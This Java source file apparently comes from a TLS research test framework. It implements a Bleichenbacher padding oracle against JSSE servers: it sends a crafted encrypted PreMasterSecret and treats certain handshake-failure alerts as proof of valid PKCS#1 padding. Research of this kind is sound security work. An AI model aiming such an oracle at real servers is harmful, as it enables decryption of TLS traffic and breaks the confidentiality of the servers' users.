package de.rub.nds.ssl.stack.tests.attacks.bleichenbacher.oracles;

import de.rub.nds.ssl.stack.protocols.alert.Alert;
import de.rub.nds.ssl.stack.protocols.alert.datatypes.EAlertDescription;
import de.rub.nds.ssl.stack.protocols.commons.KeyExchangeParams;
import de.rub.nds.ssl.stack.protocols.handshake.ClientKeyExchange;
import de.rub.nds.ssl.stack.protocols.handshake.datatypes.EncPreMasterSecret;
import de.rub.nds.ssl.stack.protocols.handshake.datatypes.PreMasterSecret;
import de.rub.nds.ssl.stack.tests.attacks.bleichenbacher.exceptions.OracleException;
import de.rub.nds.ssl.stack.trace.MessageContainer;
import de.rub.nds.ssl.stack.workflows.TLS10HandshakeWorkflow;
import de.rub.nds.ssl.stack.workflows.commons.ObservableBridge;
import java.net.SocketException;
import java.security.PublicKey;
import java.util.Observable;

/**
 * JSSE Bleichenbacher oracle - Alert:Handshake_Failure in special cases.
 *
 * @author Christopher Meyer - christopher.meyer@rub.de
 * @version 0.1
 *
 * Nov 11, 2012
 */
public class JSSE17Oracle extends ASSLServerOracle {

    public JSSE17Oracle(final String serverAddress, final int serverPort)
            throws SocketException {
        super(serverAddress, serverPort);
    }

    @Override
    public boolean checkPKCSConformity(final byte[] msg) throws
            OracleException {
        exectuteWorkflow(msg);

        return oracleResult();
    }

    /**
     * Update observed object.
     *
     * @param o Observed object
     * @param arg Arguments
     */
    @Override
    public void update(final Observable o, final Object arg) {
        MessageContainer trace = null;
        TLS10HandshakeWorkflow.EStates state = null;
        setOracleResult(false);
        ObservableBridge obs;
        if (o != null && o instanceof ObservableBridge) {
            obs = (ObservableBridge) o;
            state = (TLS10HandshakeWorkflow.EStates) obs.getState();
            trace = (MessageContainer) arg;
        }
        if (state != null) {
            switch (state) {
                case CLIENT_KEY_EXCHANGE:
                    KeyExchangeParams keyParams =
                            KeyExchangeParams.getInstance();
                    PublicKey pk = keyParams.getPublicKey();
                    ClientKeyExchange cke = new ClientKeyExchange(
                            PROTOCOL_VERSION,
                            keyParams.getKeyExchangeAlgorithm());
                    PreMasterSecret pms = new PreMasterSecret(PROTOCOL_VERSION);
                    getWorkflow().setPreMasterSecret(pms);
                    pms.setProtocolVersion(PROTOCOL_VERSION);

                    //encrypt the PreMasterSecret
                    EncPreMasterSecret encPMS =
                            new EncPreMasterSecret(pk);
                    encPMS.setEncryptedPreMasterSecret(getEncPMStoCheck());
                    cke.setExchangeKeys(encPMS);

                    trace.setCurrentRecord(cke);
                    break;
                case ALERT:
                    Alert alert = new Alert(trace.getCurrentRecord().
                            encode(false), false);

                    if (EAlertDescription.HANDSHAKE_FAILURE.equals(
                            alert.getAlertDescription())
                            && !(TLS10HandshakeWorkflow.EStates.SERVER_CHANGE_CIPHER_SPEC.
                            equals(trace.getPreviousState())
                            || TLS10HandshakeWorkflow.EStates.SERVER_FINISHED.
                            equals(trace.getPreviousState()))) {
                        setOracleResult(true);
                    }
                    break;
                default:
                    break;
            }
        }
    }
}
